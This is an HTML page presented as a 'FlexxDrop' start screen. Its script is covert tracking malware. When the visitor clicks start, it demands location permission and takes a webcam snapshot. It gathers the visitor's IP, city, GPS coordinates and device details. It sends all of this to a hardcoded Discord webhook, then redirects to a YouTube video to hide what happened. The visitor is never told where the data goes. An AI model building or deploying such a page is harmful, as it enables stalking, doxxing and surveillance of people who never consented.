<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>FlexxDrop</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    #startBtn, #retryBtn {
      padding: 0.5em 1em;
      font-size: 1.1rem;
      background: #222;
      border: 1px solid #fff;
      color: #fff;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 1em;
    }
  </style>
</head>
<body>
  <div id="status">
    <button id="startBtn">Start FlexxDrop</button>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    let capturedImageData = null;
    let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No'
      };
    }

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while(n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    function sendToDiscord(ipData) {
      const mapLink = coords.lat !== "Permission denied"
        ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : "N/A";
      const device = getDeviceInfo();
      const payload = {
        embeds: [{
          title: "üìç GPS & Device Info",
          description: `**Latitude:** ${coords.lat}  
**Longitude:** ${coords.lon}  
**Accuracy:** ${coords.acc} meters  
**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}

üåê **IP Info**  
**IP:** ${ipData.ipAddress}  
**City:** ${ipData.city}  
**Region:** ${ipData.stateProv}  
**Country:** ${ipData.countryName}

üñ•Ô∏è **Device Info**  
**Platform:** ${device.platform}  
**Browser:** ${device.userAgent}  
**Language:** ${device.language}  
**Screen:** ${device.screen}  
**Touch Support:** ${device.touchSupport}

üïí ${new Date().toLocaleString()}`
        }],
        files: capturedImageData
          ? [{ name: "snapshot.png", type: "image/png", data: capturedImageData }]
          : []
      };

      const formData = new FormData();
      formData.append("payload_json", JSON.stringify(payload));
      if (capturedImageData) {
        const blob = dataURLtoBlob(capturedImageData);
        formData.append("files[0]", blob, "snapshot.png");
      }

      fetch(webhookUrl, { method: "POST", body: formData })
        .finally(() => window.location.href = redirectUrl);
    }

    async function startSequence() {
      document.getElementById("status").innerText = "Requesting permissions‚Ä¶";

      try {
        await Notification.requestPermission().catch(() => {});

        let locationAllowed = false;

        await new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              coords.lat = pos.coords.latitude;
              coords.lon = pos.coords.longitude;
              coords.acc = pos.coords.accuracy;
              locationAllowed = true;
              resolve();
            },
            () => resolve(), // even if denied, we resolve
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        });

        if (!locationAllowed) {
          document.body.innerHTML = `
            <div>
              <p style="color:white;">üìç Location permission not granted.<br>Please allow location access and reload the page to continue.</p>
              <button id="retryBtn">Try Again</button>
            </div>`;
          document.getElementById("retryBtn").onclick = () => location.reload();
          return;
        }

        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          await new Promise((resolve) => {
            video.onloadedmetadata = () => {
              const canvas = document.createElement("canvas");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              capturedImageData = canvas.toDataURL("image/png");
              stream.getTracks().forEach(track => track.stop());
              resolve();
            };
          });
        } catch {
          // camera denied ‚Äî continue
        }

        fetch("https://api.db-ip.com/v2/free/self")
          .then(res => res.json())
          .then(sendToDiscord)
          .catch(() => {
            sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
          });

      } catch (err) {
        document.body.innerHTML = `
          <div>
            <p style="color:white;">‚ùå Unexpected error.<br>Please reload the page and try again.</p>
            <button id="retryBtn">Reload</button>
          </div>`;
        document.getElementById("retryBtn").onclick = () => location.reload();
      }
    }

    document.getElementById("startBtn").onclick = startSequence;
  </script>
</body>
</html>
